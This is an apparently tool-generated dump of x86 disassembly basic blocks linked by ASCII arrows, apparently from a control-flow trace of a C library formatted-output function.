0xb047529:	jmp	0xb044ca0
None
|
|
|
v
0xb0439d1:	mov	eax, 0xffffffff
0xb0439d6:	jmp	0xb0439ab
None
|
|
|
v
0xb043b84:	jmp	0xb0439a5
None
|
|
|
v
0xb04398a:	mov	edx, dword ptr [esi + 0x48]
0xb04398d:	sub	dword ptr [edx + 4], 1
0xb043991:	je	0xb043b38
None
|
|
|
v
0xb044e2e:	mov	edx, dword ptr [edi + 0x18]
0xb044e31:	sub	edx, dword ptr [edi + 0x14]
0xb044e34:	mov	dword ptr [ebp - 0x46c], 0
0xb044e3e:	cmp	eax, edx
0xb044e40:	jne	0xb043da4
None
|
|
|
v
0xb045cf6:	mov	ecx, dword ptr [esi + 0x24]
0xb045cf9:	lea	edx, dword ptr [ecx*4]
0xb045d00:	mov	ecx, dword ptr [esi + 8]
0xb045d03:	mov	dword ptr [ebp - 0x46c], edx
0xb045d09:	mov	edx, dword ptr [ebx + 0xec8]
0xb045d0f:	mov	dword ptr [ebp - 0x478], edx
0xb045d15:	mov	edx, dword ptr [ebp - 0x474]
0xb045d1b:	add	edx, dword ptr [ebp - 0x46c]
0xb045d21:	mov	dword ptr [esp + 0xc], edx
0xb045d25:	mov	edx, dword ptr [ebp - 0x46c]
0xb045d2b:	mov	dword ptr [esp + 4], eax
0xb045d2f:	mov	dword ptr [esp], esi
0xb045d32:	add	edx, edi
0xb045d34:	mov	dword ptr [esp + 8], edx
0xb045d38:	mov	edx, dword ptr [ebp - 0x478]
0xb045d3e:	call	dword ptr [edx + ecx*4]
None
|
|
|
v
0xb04880f:	lea	ecx, dword ptr [edx]
0xb048811:	call	0xb0f9430
None
|
|
|
v
0xb043dae:	cmp	byte ptr [ebp - 0x479], 0
0xb043db5:	je	0xb043dc5
None
|
|
|
v
0xb0484d3:	mov	dword ptr [ebp - 0x494], eax
0xb0484d9:	jmp	0xb045c28
None
|
|
|
v
0xb043def:	jmp	0xb043982
None
|
|
|
v
0xb043bc5:	jmp	0xb043945
None
|
|
|
v
0xb0485cb:	jmp	0xb044c4a
None
|
|
|
v
0xb043b90:	mov	edx, dword ptr [ebx - 0x60]
0xb043b96:	mov	eax, dword ptr [ebx + 0x38b8]
0xb043b9c:	mov	dword ptr [esp + 8], esi
0xb043ba0:	ror	eax, 9
0xb043ba3:	xor	eax, dword ptr gs:[0x18]
0xb043baa:	mov	dword ptr [esp + 4], edx
0xb043bae:	lea	edx, dword ptr [ebp - 0x424]
0xb043bb4:	mov	dword ptr [esp], edx
0xb043bb7:	call	eax
None
|
|
|
v
0xb045d89:	cmp	eax, 1
0xb045d8c:	jg	0xb045e40
None
|
|
|
v
0xb043894:	mov	edx, dword ptr [esi + 0x68]
0xb043897:	test	edx, edx
0xb043899:	jne	0xb0439f0
None
|
|
|
v
0xb044d05:	add	ecx, 0xf
0xb044d08:	xor	edx, edx
0xb044d0a:	and	ecx, 0xfffffff0
0xb044d0d:	mov	dword ptr [ebp - 0x478], ecx
0xb044d13:	lea	eax, dword ptr [ecx + 0x1e]
0xb044d16:	mov	ecx, 0x10
0xb044d1b:	div	ecx
0xb044d1d:	mov	ecx, dword ptr [ebp - 0x478]
0xb044d23:	shl	eax, 4
0xb044d26:	sub	esp, eax
0xb044d28:	lea	eax, dword ptr [esp + 0x23]
0xb044d2c:	and	eax, 0xfffffff0
0xb044d2f:	lea	edx, dword ptr [eax + ecx]
0xb044d32:	mov	dword ptr [ebp - 0x470], eax
0xb044d38:	mov	eax, dword ptr [ebp - 0x468]
0xb044d3e:	add	eax, ecx
0xb044d40:	cmp	dword ptr [ebp - 0x460], edx
0xb044d46:	cmove	ecx, eax
0xb044d49:	mov	dword ptr [ebp - 0x468], ecx
0xb044d4f:	mov	dword ptr [esp + 8], edi
0xb044d53:	mov	eax, dword ptr [ebp - 0x460]
0xb044d59:	mov	dword ptr [esp + 4], eax
0xb044d5d:	mov	eax, dword ptr [ebp - 0x470]
0xb044d63:	mov	dword ptr [esp], eax
0xb044d66:	call	0xb07c960
None
|
|
|
v
0xb045c13:	lea	eax, dword ptr [edi + 0x1e]
0xb045c16:	and	eax, 0xfffffff0
0xb045c19:	sub	esp, eax
0xb045c1b:	lea	eax, dword ptr [esp + 0x23]
0xb045c1f:	and	eax, 0xfffffff0
0xb045c22:	mov	dword ptr [ebp - 0x494], eax
0xb045c28:	mov	ecx, dword ptr [ebp - 0x470]
0xb045c2e:	xor	edi, edi
0xb045c30:	mov	edx, dword ptr [ebp - 0x494]
0xb045c36:	lea	eax, dword ptr [ecx + ecx*2]
0xb045c39:	lea	eax, dword ptr [edx + eax*4]
0xb045c3c:	mov	dword ptr [ebp - 0x474], eax
0xb045c42:	mov	edx, eax
0xb045c44:	mov	eax, ecx
0xb045c46:	shl	eax, 2
0xb045c49:	mov	ecx, edx
0xb045c4b:	add	ecx, eax
0xb045c4d:	mov	dword ptr [esp + 8], eax
0xb045c51:	mov	eax, dword ptr [esi + 0x3c]
0xb045c54:	mov	dword ptr [esp], ecx
0xb045c57:	shl	eax, 0x1d
0xb045c5a:	sar	eax, 0x1f
0xb045c5d:	mov	dword ptr [esp + 4], eax
0xb045c61:	mov	dword ptr [ebp - 0x468], ecx
0xb045c67:	call	0xb07ca20
None
|
|
|
v
0xb045ce3:	mov	dword ptr [edi + eax*4], 0
0xb045cea:	mov	eax, dword ptr [esi + 0x2c]
0xb045ced:	test	eax, eax
0xb045cef:	je	0xb045cb0
None
|
|
|
v
0xb045f1b:	test	al, al
0xb045f1d:	jne	0xb044c57
None
|
|
|
v
0xb0484e9:	mov	eax, dword ptr [ebp - 0x474]
0xb0484ef:	mov	edi, dword ptr [ebp - 0x468]
0xb0484f5:	mov	dword ptr [ebp - 0x4cc], ecx
0xb0484fb:	mov	dword ptr [ebp - 0x478], edx
0xb048501:	mov	eax, dword ptr [eax + edx*4]
0xb048504:	add	eax, 0x1e
0xb048507:	and	eax, 0xfffffff0
0xb04850a:	sub	esp, eax
0xb04850c:	lea	eax, dword ptr [esp + 0x23]
0xb048510:	and	eax, 0xfffffff0
0xb048513:	mov	dword ptr [edi], eax
0xb048515:	mov	esi, dword ptr [ecx + edx*4]
0xb048518:	mov	ecx, dword ptr [ebx + 0xecc]
0xb04851e:	mov	edx, dword ptr [ebp - 0x46c]
0xb048524:	mov	dword ptr [esp], eax
0xb048527:	mov	dword ptr [esp + 4], edx
0xb04852b:	call	dword ptr [ecx + esi*4 - 0x20]
None
|
|
|
v
0xb046bcf:	mov	edi, dword ptr [ebp - 0x470]
0xb046bd5:	mov	edx, dword ptr [ebp - 0x4cc]
0xb046bdb:	mov	eax, edi
0xb046bdd:	add	eax, 0x20
0xb046be0:	cmp	edx, edi
0xb046be2:	mov	dword ptr [ebp - 0x4d4], eax
0xb046be8:	lea	eax, dword ptr [edx + 0x20]
0xb046beb:	mov	edx, dword ptr [ebp - 0x46c]
0xb046bf1:	cmovl	eax, dword ptr [ebp - 0x4d4]
0xb046bf8:	lea	edi, dword ptr [edx + eax]
0xb046bfb:	jmp	0xb0460c9
None
|
|
|
v
0xb04607a:	add	edi, 0x20
0xb04607d:	cmp	edi, 0x1000
0xb046083:	ja	0xb046b91
None
|
|
|
v
0xb043b61:	lea	edx, dword ptr [ebp - 0x424]
0xb043b67:	mov	eax, dword ptr [ebx + 0x38bc]
0xb043b6d:	mov	dword ptr [esp + 4], 0
0xb043b75:	ror	eax, 9
0xb043b78:	xor	eax, dword ptr gs:[0x18]
0xb043b7f:	mov	dword ptr [esp], edx
0xb043b82:	call	eax
None
|
|
|
v
0xb046089:	lea	eax, dword ptr [edi + 0x1e]
0xb04608c:	mov	edx, dword ptr [ebp - 0x470]
0xb046092:	and	eax, 0xfffffff0
0xb046095:	sub	esp, eax
0xb046097:	mov	eax, dword ptr [ebp - 0x4cc]
0xb04609d:	lea	edi, dword ptr [esp + 0x23]
0xb0460a1:	and	edi, 0xfffffff0
0xb0460a4:	add	eax, 0x20
0xb0460a7:	mov	dword ptr [ebp - 0x46c], eax
0xb0460ad:	lea	eax, dword ptr [edx + 0x20]
0xb0460b0:	cmp	dword ptr [ebp - 0x4cc], edx
0xb0460b6:	cmovge	eax, dword ptr [ebp - 0x46c]
0xb0460bd:	mov	dword ptr [ebp - 0x46c], 0
0xb0460c7:	add	edi, eax
0xb0460c9:	mov	eax, dword ptr [ebx + 0x3768]
0xb0460cf:	test	eax, eax
0xb0460d1:	je	0xb0461e3
None
|
|
|
v
0xb043978:	mov	dword ptr [ebp - 0x44c], 0xffffffff
0xb043982:	test	dword ptr [esi], 0x8000
0xb043988:	jne	0xb043997
None
|
|
|
v
0xb046b79:	lea	eax, dword ptr [ebx - 0x4a72d]
0xb046b7f:	mov	dword ptr [esp + 4], eax
0xb046b83:	lea	eax, dword ptr [ebx - 0x45d60]
0xb046b89:	mov	dword ptr [esp], eax
0xb046b8c:	call	0xb027820
None
|
|
|
v
0xb0439b3:	mov	dword ptr [esp + 4], 0xffffffff
0xb0439bb:	mov	dword ptr [esp], esi
0xb0439be:	call	0xb066ae0
None
|
|
|
v
0xb043de1:	mov	eax, dword ptr [ebp - 0x46c]
0xb043de7:	mov	dword ptr [esp], eax
0xb043dea:	call	0xb017470
None
|
|
|
v
0xb0474f8:	mov	eax, dword ptr [ebp - 0x468]
0xb0474fe:	mov	dword ptr [esp], eax
0xb047501:	call	0xb0f8ac0
None
|
|
|
v
0xb0438fc:	mov	eax, dword ptr [ebx - 0x60]
0xb043902:	mov	dword ptr [ebp - 0x420], esi
0xb043908:	mov	dword ptr [ebp - 0x424], eax
0xb04390e:	mov	edx, dword ptr [esi + 0x48]
0xb043911:	mov	edi, dword ptr gs:[8]
0xb043918:	cmp	edi, dword ptr [edx + 8]
0xb04391b:	je	0xb043941
None
|
|
|
v
0xb045e36:	mov	esi, dword ptr [ebp + 8]
0xb045e39:	jmp	0xb044e66
None
|
|
|
v
0xb04605b:	mov	eax, dword ptr [ebp - 0x4cc]
0xb046061:	mov	edx, dword ptr [ebp - 0x470]
0xb046067:	mov	edi, eax
0xb046069:	cmp	edx, eax
0xb04606b:	cmovge	edi, edx
0xb04606e:	cmp	edi, 0x3c8
0xb046074:	jle	0xb04629e
None
|
|
|
v
0xb043810:	push	ebp
0xb043811:	mov	eax, dword ptr gs:[0]
0xb043817:	mov	ebp, esp
0xb043819:	push	edi
0xb04381a:	push	esi
0xb04381b:	push	ebx
0xb04381c:	call	0xb1267db
None
|
|
|
v
0xb045f23:	mov	dword ptr [ebp - 0x484], 0
0xb045f2d:	jmp	0xb044c57
None
|
|
|
v
0xb04602e:	mov	dword ptr [ecx + 4], edx
0xb046031:	mov	dword ptr [ebp - 0x4cc], edx
0xb046037:	mov	eax, dword ptr [ecx + 0x1c]
0xb04603a:	cmp	eax, 0xff
0xb04603d:	je	0xb04605b
None
|
|
|
v
0xb04601a:	mov	eax, dword ptr [ebp - 0x494]
0xb046020:	lea	edx, dword ptr [edx + edx*2]
0xb046023:	mov	edx, dword ptr [eax + edx*4]
0xb046026:	test	edx, edx
0xb046028:	js	0xb0462e0
None
|
|
|
v
0xb043a00:	mov	eax, dword ptr [ebp - 0x444]
0xb043a06:	cmp	byte ptr [eax], 0
0xb043a09:	je	0xb043982
None
|
|
|
v
0xb045ddd:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb044cc6:	mov	esi, dword ptr [edi + 0x18]
0xb044cc9:	add	dword ptr [ebp - 0x464], 1
0xb044cd0:	add	dword ptr [ebp - 0x46c], eax
0xb044cd6:	mov	dword ptr [ebp - 0x444], esi
0xb044cdc:	cmp	byte ptr [esi], 0
0xb044cdf:	je	0xb045bd0
None
|
|
|
v
0xb045e06:	mov	eax, dword ptr [ebp - 0x440]
0xb045e0c:	lea	esi, dword ptr [eax + 0xc]
0xb045e0f:	fld	xword ptr [eax]
0xb045e11:	mov	dword ptr [ebp - 0x440], esi
0xb045e17:	mov	eax, dword ptr [ebp - 0x468]
0xb045e1d:	fstp	xword ptr [eax]
0xb045e1f:	nop	
0xb045e20:	add	edx, 1
0xb045e23:	add	dword ptr [ebp - 0x468], 0xc
0xb045e2a:	cmp	edx, dword ptr [ebp - 0x470]
0xb045e30:	jne	0xb045d78
None
|
|
|
v
0xb043dc5:	mov	eax, dword ptr [ebp - 0x490]
0xb043dcb:	test	eax, eax
0xb043dcd:	jne	0xb046302
None
|
|
|
v
0xb046170:	mov	edx, dword ptr [ebp - 0x4d4]
0xb046176:	mov	dword ptr [esp + 4], ecx
0xb04617a:	mov	dword ptr [esp], esi
0xb04617d:	mov	dword ptr [esp + 8], edx
0xb046181:	mov	ecx, dword ptr [ebp - 0x4d8]
0xb046187:	call	dword ptr [eax + ecx*4]
None
|
|
|
v
0xb046053:	mov	dword ptr [ecx], eax
0xb046055:	mov	dword ptr [ebp - 0x470], eax
0xb04605b:	mov	eax, dword ptr [ebp - 0x4cc]
0xb046061:	mov	edx, dword ptr [ebp - 0x470]
0xb046067:	mov	edi, eax
0xb046069:	cmp	edx, eax
0xb04606b:	cmovge	edi, edx
0xb04606e:	cmp	edi, 0x3c8
0xb046074:	jle	0xb04629e
None
|
|
|
v
0xb048822:	jmp	0xb043b53
None
|
|
|
v
0xb045177:	mov	eax, dword ptr [ebp - 0x454]
0xb04517d:	mov	ecx, dword ptr [ebx - 0xdc]
0xb045183:	mov	dword ptr [eax + ecx], 0x4b
0xb04518a:	jmp	0xb043da4
None
|
|
|
v
0xb044c4a:	cmp	dword ptr [ebp - 0x484], -1
0xb044c51:	je	0xb045ef0
None
|
|
|
v
0xb046cf3:	lea	eax, dword ptr [ebx - 0x4a72d]
0xb046cf9:	mov	dword ptr [esp + 4], eax
0xb046cfd:	lea	eax, dword ptr [ebx - 0x45d30]
0xb046d03:	mov	dword ptr [esp], eax
0xb046d06:	call	0xb027820
None
|
|
|
v
0xb04391d:	xor	eax, eax
0xb04391f:	mov	ecx, 1
0xb043924:	cmp	dword ptr gs:[0xc], 0
0xb04392c:	je	0xb04392f
None
|
|
|
v
0xb045d48:	mov	esi, dword ptr [ebp + 8]
0xb045d4b:	mov	ecx, edi
0xb045d4d:	lea	eax, dword ptr [ebp - 0x440]
0xb045d53:	xor	edx, edx
0xb045d55:	mov	edi, dword ptr [ebp - 0x494]
0xb045d5b:	mov	dword ptr [ebp - 0x46c], eax
0xb045d61:	mov	eax, dword ptr [ebp - 0x470]
0xb045d67:	test	eax, eax
0xb045d69:	je	0xb044e66
None
|
|
|
v
0xb045c6c:	mov	eax, dword ptr [ebp - 0x464]
0xb045c72:	mov	edx, dword ptr [ebp - 0x460]
0xb045c78:	mov	ecx, dword ptr [ebp - 0x468]
0xb045c7e:	test	eax, eax
0xb045c80:	je	0xb045d4d
None
|
|
|
v
0xb043bd0:	movsx	eax, byte ptr [ebp - 0x480]
0xb043bd7:	mov	ecx, dword ptr [ebp - 0x468]
0xb043bdd:	movzx	eax, byte ptr [ebx + eax - 0x50380]
0xb043be5:	add	ecx, dword ptr [ebx + eax*4 - 0x503e0]
0xb043bec:	mov	eax, ecx
0xb043bee:	jmp	0xb043aa3
None
|
|
|
v
0xb046158:	mov	dword ptr [eax], edx
0xb04615a:	add	eax, 4
0xb04615d:	add	edx, 0xc
0xb046160:	cmp	eax, edi
0xb046162:	jne	0xb046158
None
|
|
|
v
0xb0439c8:	cmp	eax, 0xff
0xb0439cb:	je	0xb04386b
None
|
|
|
v
0xb045d78:	mov	eax, dword ptr [ecx + edx*4]
0xb045d7b:	cmp	eax, 5
0xb045d7e:	jg	0xb045de0
None
|
|
|
v
0xb04390e:	mov	edx, dword ptr [esi + 0x48]
0xb043911:	mov	edi, dword ptr gs:[8]
0xb043918:	cmp	edi, dword ptr [edx + 8]
0xb04391b:	je	0xb043941
None
|
|
|
v
0xb04384b:	mov	eax, dword ptr [ebx - 0xf8]
0xb043851:	test	eax, eax
0xb043853:	je	0xb0439b3
None
|
|
|
v
0xb044def:	mov	eax, dword ptr [ebp - 0x44c]
0xb044df5:	test	eax, eax
0xb044df7:	js	0xb0483b9
None
|
|
|
v
0xb045c28:	mov	ecx, dword ptr [ebp - 0x470]
0xb045c2e:	xor	edi, edi
0xb045c30:	mov	edx, dword ptr [ebp - 0x494]
0xb045c36:	lea	eax, dword ptr [ecx + ecx*2]
0xb045c39:	lea	eax, dword ptr [edx + eax*4]
0xb045c3c:	mov	dword ptr [ebp - 0x474], eax
0xb045c42:	mov	edx, eax
0xb045c44:	mov	eax, ecx
0xb045c46:	shl	eax, 2
0xb045c49:	mov	ecx, edx
0xb045c4b:	add	ecx, eax
0xb045c4d:	mov	dword ptr [esp + 8], eax
0xb045c51:	mov	eax, dword ptr [esi + 0x3c]
0xb045c54:	mov	dword ptr [esp], ecx
0xb045c57:	shl	eax, 0x1d
0xb045c5a:	sar	eax, 0x1f
0xb045c5d:	mov	dword ptr [esp + 4], eax
0xb045c61:	mov	dword ptr [ebp - 0x468], ecx
0xb045c67:	call	0xb07ca20
None
|
|
|
v
0xb0438ae:	mov	eax, dword ptr [ebp + 0x10]
0xb0438b1:	mov	dword ptr [ebp - 0x440], eax
0xb0438b7:	mov	dword ptr [esp + 4], 0x25
0xb0438bf:	mov	eax, dword ptr [ebp + 0xc]
0xb0438c2:	mov	dword ptr [esp], eax
0xb0438c5:	call	0xb07ee30
None
|
|
|
v
0xb0461f5:	movsx	eax, byte ptr [ebp - 0x468]
0xb0461fc:	lea	ecx, dword ptr [ebx - 0x165bcc]
0xb046202:	mov	dword ptr [ebp - 0x468], ecx
0xb046208:	movzx	eax, byte ptr [ebx + eax - 0x50380]
0xb046210:	mov	eax, dword ptr [ebx + eax*4 - 0x506e0]
0xb046217:	movzx	ecx, byte ptr [ebp - 0x474]
0xb04621e:	mov	dword ptr [ebp - 0x4e0], ecx
0xb046224:	movzx	ecx, byte ptr [ebp - 0x478]
0xb04622b:	mov	dword ptr [ebp - 0x4d4], ecx
0xb046231:	movzx	ecx, byte ptr [ebp - 0x4d0]
0xb046238:	mov	dword ptr [ebp - 0x4d8], ecx
0xb04623e:	movzx	ecx, byte ptr [ebp - 0x4e4]
0xb046245:	mov	dword ptr [ebp - 0x4f4], ecx
0xb04624b:	movzx	ecx, byte ptr [ebp - 0x4ec]
0xb046252:	mov	dword ptr [ebp - 0x4ec], ecx
0xb046258:	movzx	ecx, byte ptr [ebp - 0x47b]
0xb04625f:	mov	dword ptr [ebp - 0x4e4], ecx
0xb046265:	movzx	ecx, byte ptr [ebp - 0x4e8]
0xb04626c:	mov	dword ptr [ebp - 0x4f0], ecx
0xb046272:	movzx	ecx, byte ptr [ebp - 0x4f8]
0xb046279:	mov	dword ptr [ebp - 0x4e8], ecx
0xb04627f:	movzx	ecx, byte ptr [ebp - 0x4fc]
0xb046286:	mov	dword ptr [ebp - 0x4f8], ecx
0xb04628c:	movzx	ecx, byte ptr [ebp - 0x500]
0xb046293:	mov	byte ptr [ebp - 0x47b], cl
0xb046299:	jmp	0xb0449e0
None
|
|
|
v
0xb04392e:	lock cmpxchg	dword ptr [edx], ecx
0xb043932:	jne	0xb04880f
None
|
|
|
v
0xb045deb:	jle	0xb045e60
None
|
|
|
v
0xb0485a4:	mov	dword ptr [esp], ecx
0xb0485a7:	mov	dword ptr [ebp - 0x468], ecx
0xb0485ad:	call	0xb0173f0
None
|
|
|
v
0xb043b53:	mov	ecx, dword ptr [ebp - 0x450]
0xb043b59:	test	ecx, ecx
0xb043b5b:	je	0xb0439a5
None
|
|
|
v
0xb043db7:	mov	eax, dword ptr [ebp - 0x460]
0xb043dbd:	mov	dword ptr [esp], eax
0xb043dc0:	call	0xb017470
None
|
|
|
v
0xb043821:	add	ebx, 0x1677df
0xb043827:	sub	esp, 0x50c
0xb04382d:	mov	esi, dword ptr [ebp + 8]
0xb043830:	mov	dword ptr [ebp - 0x454], eax
0xb043836:	cmp	byte ptr [esi + 0x46], 0
0xb04383a:	mov	ecx, dword ptr [ebx - 0xdc]
0xb043840:	mov	eax, dword ptr [eax + ecx]
0xb043843:	mov	dword ptr [ebp - 0x45c], eax
0xb043849:	jne	0xb04386b
None
|
|
|
v
0xb045d6f:	mov	dword ptr [ebp - 0x468], edi
0xb045d75:	mov	dword ptr [ebp + 8], esi
0xb045d78:	mov	eax, dword ptr [ecx + edx*4]
0xb045d7b:	cmp	eax, 5
0xb045d7e:	jg	0xb045de0
None
|
|
|
v
0xb0462e0:	mov	eax, edi
0xb0462e2:	neg	edx
0xb0462e4:	or	eax, 0x20
0xb0462e7:	mov	dword ptr [ecx + 4], edx
0xb0462ea:	mov	byte ptr [ecx + 0xc], al
0xb0462ed:	mov	dword ptr [ebp - 0x4cc], edx
0xb0462f3:	mov	dword ptr [ebp - 0x4dc], 1
0xb0462fd:	jmp	0xb046037
None
|
|
|
v
0xb04854f:	mov	eax, dword ptr [ebp - 0x454]
0xb048555:	mov	ecx, dword ptr [ebx - 0xdc]
0xb04855b:	mov	dword ptr [ebp - 0x46c], 0
0xb048565:	mov	dword ptr [eax + ecx], 0x4b
0xb04856c:	jmp	0xb043da4
None
|
|
|
v
0xb046bad:	mov	dword ptr [ebp - 0x4d4], ecx
0xb046bb3:	mov	dword ptr [esp], edi
0xb046bb6:	call	0xb0173f0
None
|
|
|
v
0xb043982:	test	dword ptr [esi], 0x8000
0xb043988:	jne	0xb043997
None
|
|
|
v
0xb044e46:	mov	edx, 0x7fffffff
0xb044e4b:	sub	edx, dword ptr [ebp - 0x44c]
0xb044e51:	add	dword ptr [ebp - 0x488], 1
0xb044e58:	add	dword ptr [ebp - 0x44c], eax
0xb044e5e:	cmp	eax, edx
0xb044e60:	jg	0xb045177
None
|
|
|
v
0xb0484c9:	test	eax, eax
0xb0484cb:	mov	dword ptr [ebp - 0x490], eax
0xb0484d1:	je	0xb048540
None
|
|
|
v
0xb0461c0:	jmp	0xb045177
None
|
|
|
v
0xb043dd3:	mov	edi, dword ptr [ebp - 0x46c]
0xb043dd9:	test	edi, edi
0xb043ddb:	je	0xb043982
None
|
|
|
v
0xb0439c3:	nop	
0xb0439c4:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb043880:	cmp	byte ptr [esi + 0x46], 0
0xb043884:	jne	0xb0438a6
None
|
|
|
v
0xb044ce5:	imul	edi, dword ptr [ebp - 0x464], 0x34
0xb044cec:	mov	eax, dword ptr [ebp - 0x468]
0xb044cf2:	cmp	eax, edi
0xb044cf4:	ja	0xb044ca0
None
|
|
|
v
0xb043bb9:	test	dword ptr [esi], 0x8000
0xb043bbf:	je	0xb04390e
None
|
|
|
v
0xb048596:	mov	ecx, dword ptr [ebp - 0x470]
0xb04859c:	test	eax, eax
0xb04859e:	jne	0xb044d05
None
|
|
|
v
0xb044ca0:	mov	eax, dword ptr [ebp - 0x474]
0xb044ca6:	add	edi, dword ptr [ebp - 0x460]
0xb044cac:	mov	dword ptr [esp + 0xc], eax
0xb044cb0:	mov	dword ptr [esp + 8], edi
0xb044cb4:	mov	eax, dword ptr [ebp - 0x46c]
0xb044cba:	mov	dword ptr [esp], esi
0xb044cbd:	mov	dword ptr [esp + 4], eax
0xb044cc1:	call	0xb0625f0
None
|
|
|
v
0xb0484c1:	mov	dword ptr [esp], edi
0xb0484c4:	call	0xb0173f0
None
|
|
|
v
0xb044c57:	mov	eax, dword ptr [ebp - 0x458]
0xb044c5d:	mov	dword ptr [ebp - 0x444], eax
0xb044c63:	cmp	byte ptr [eax], 0
0xb044c66:	je	0xb0461c8
None
|
|
|
v
0xb044bdc:	mov	byte ptr [ebp - 0x479], 0
0xb044be3:	mov	dword ptr [ebp - 0x490], 0
0xb044bed:	mov	dword ptr [ebp - 0x498], 0
0xb044bf7:	mov	dword ptr [ebp - 0x488], 0
0xb044c01:	mov	dword ptr [ebp - 0x46c], 0
0xb044c0b:	mov	dword ptr [ebp - 0x484], 0xffffffff
0xb044c15:	mov	dword ptr [ebp - 0x48c], 0
0xb044c1f:	sub	esp, 0x690
0xb044c25:	lea	eax, dword ptr [esp + 0x23]
0xb044c29:	and	eax, 0xfffffff0
0xb044c2c:	mov	dword ptr [ebp - 0x460], eax
0xb044c32:	mov	eax, dword ptr [ebp - 0x46c]
0xb044c38:	mov	dword ptr [ebp - 0x43c], 0
0xb044c42:	test	eax, eax
0xb044c44:	jne	0xb0485bd
None
|
|
|
v
0xb0484ab:	mov	dword ptr [esp], edx
0xb0484ae:	mov	dword ptr [ebp - 0x468], edx
0xb0484b4:	call	0xb0f8ac0
None
|
|
|
v
0xb045cdb:	mov	eax, dword ptr [esi + 0x1c]
0xb045cde:	cmp	eax, 0xff
0xb045ce1:	je	0xb045cea
None
|
|
|
v
0xb045db3:	lea	eax, dword ptr [ebx - 0x4a6f8]
0xb045db9:	mov	dword ptr [esp + 0xc], eax
0xb045dbd:	lea	eax, dword ptr [ebx - 0x4a72d]
0xb045dc3:	mov	dword ptr [esp + 4], eax
0xb045dc7:	lea	eax, dword ptr [ebx - 0x4a707]
0xb045dcd:	mov	dword ptr [esp + 8], 0x773
0xb045dd5:	mov	dword ptr [esp], eax
0xb045dd8:	call	0xb027820
None
|
|
|
v
0xb044d6b:	cmp	byte ptr [ebp - 0x479], 0
0xb044d72:	jne	0xb045bb8
None
|
|
|
v
0xb045c98:	mov	edx, dword ptr [esi + 0x28]
0xb045c9b:	mov	eax, dword ptr [esi + 0x24]
0xb045c9e:	mov	ecx, dword ptr [ebp - 0x474]
0xb045ca4:	mov	dword ptr [edi + eax*4], edx
0xb045ca7:	mov	edx, dword ptr [esi + 0x30]
0xb045caa:	mov	eax, dword ptr [esi + 0x24]
0xb045cad:	mov	dword ptr [ecx + eax*4], edx
0xb045cb0:	add	dword ptr [ebp - 0x468], 1
0xb045cb7:	add	esi, 0x34
0xb045cba:	mov	eax, dword ptr [ebp - 0x464]
0xb045cc0:	cmp	dword ptr [ebp - 0x468], eax
0xb045cc6:	je	0xb045d48
None
|
|
|
v
0xb044dfd:	imul	eax, dword ptr [ebp - 0x488], 0x34
0xb044e04:	mov	ecx, dword ptr [ebp - 0x460]
0xb044e0a:	movsx	edx, byte ptr [esi + 0x46]
0xb044e0e:	lea	edi, dword ptr [ecx + eax]
0xb044e11:	mov	eax, dword ptr [edi + 0x14]
0xb044e14:	mov	ecx, dword ptr [edi + 0x18]
0xb044e17:	mov	edx, dword ptr [esi + edx + 0x94]
0xb044e1e:	mov	dword ptr [esp], esi
0xb044e21:	mov	dword ptr [esp + 4], eax
0xb044e25:	sub	ecx, eax
0xb044e27:	mov	dword ptr [esp + 8], ecx
0xb044e2b:	call	dword ptr [edx + 0x1c]
None
|
|
|
v
0xb045ef0:	mov	ecx, dword ptr [ebp - 0x454]
0xb045ef6:	mov	eax, dword ptr [ebx - 0x134]
0xb045efc:	mov	eax, dword ptr [ecx + eax]
0xb045eff:	mov	eax, dword ptr [eax + 4]
0xb045f02:	mov	ecx, dword ptr [eax + 0x28]
0xb045f05:	mov	eax, dword ptr [eax + 0x2c]
0xb045f08:	mov	dword ptr [ebp - 0x48c], ecx
0xb045f0e:	mov	dword ptr [ebp - 0x484], eax
0xb045f14:	movzx	eax, byte ptr [eax]
0xb045f17:	cmp	al, 0x7f
0xb045f19:	je	0xb045f23
None
|
|
|
v
0xb045d41:	jmp	0xb045cb0
None
|
|
|
v
0xb043da4:	mov	dword ptr [ebp - 0x44c], 0xffffffff
0xb043dae:	cmp	byte ptr [ebp - 0x479], 0
0xb043db5:	je	0xb043dc5
None
|
|
|
v
0xb0484de:	cmp	dword ptr [esi + eax*4 - 0x20], 0
0xb0484e3:	je	0xb045ebb
None
|
|
|
v
0xb0477b8:	jmp	0xb044def
None
|
|
|
v
0xb045cea:	mov	eax, dword ptr [esi + 0x2c]
0xb045ced:	test	eax, eax
0xb045cef:	je	0xb045cb0
None
|
|
|
v
0xb043970:	cmp	edi, eax
0xb043972:	je	0xb043a00
None
|
|
|
v
0xb04389f:	mov	dword ptr [esi + 0x68], 0xffffffff
0xb0438a6:	test	al, 2
0xb0438a8:	jne	0xb0439d8
None
|
|
|
v
0xb045bb8:	mov	eax, dword ptr [ebp - 0x460]
0xb045bbe:	mov	dword ptr [esp], eax
0xb045bc1:	call	0xb017470
None
|
|
|
v
0xb046164:	mov	edi, dword ptr [ebp - 0x4f4]
0xb04616a:	mov	eax, dword ptr [ebx + 0x3768]
0xb046170:	mov	edx, dword ptr [ebp - 0x4d4]
0xb046176:	mov	dword ptr [esp + 4], ecx
0xb04617a:	mov	dword ptr [esp], esi
0xb04617d:	mov	dword ptr [esp + 8], edx
0xb046181:	mov	ecx, dword ptr [ebp - 0x4d8]
0xb046187:	call	dword ptr [eax + ecx*4]
None
|
|
|
v
0xb043b49:	lock sub	dword ptr [edx], 1
None
|
|
|
v
0xb045e65:	mov	eax, dword ptr [ebp - 0x440]
0xb045e6b:	lea	esi, dword ptr [eax + 8]
0xb045e6e:	fld	qword ptr [eax]
0xb045e70:	mov	eax, dword ptr [ebp - 0x468]
0xb045e76:	mov	dword ptr [ebp - 0x440], esi
0xb045e7c:	fstp	qword ptr [eax]
0xb045e7e:	jmp	0xb045e20
None
|
|
|
v
0xb04618a:	cmp	eax, 0xfe
0xb04618d:	je	0xb0461e3
None
|
|
|
v
0xb043945:	mov	edi, dword ptr [ebp - 0x458]
0xb04394b:	movsx	eax, byte ptr [esi + 0x46]
0xb04394f:	sub	edi, dword ptr [ebp + 0xc]
0xb043952:	mov	eax, dword ptr [esi + eax + 0x94]
0xb043959:	mov	dword ptr [ebp - 0x44c], edi
0xb04395f:	mov	dword ptr [esp + 8], edi
0xb043963:	mov	ecx, dword ptr [ebp + 0xc]
0xb043966:	mov	dword ptr [esp], esi
0xb043969:	mov	dword ptr [esp + 4], ecx
0xb04396d:	call	dword ptr [eax + 0x1c]
None
|
|
|
v
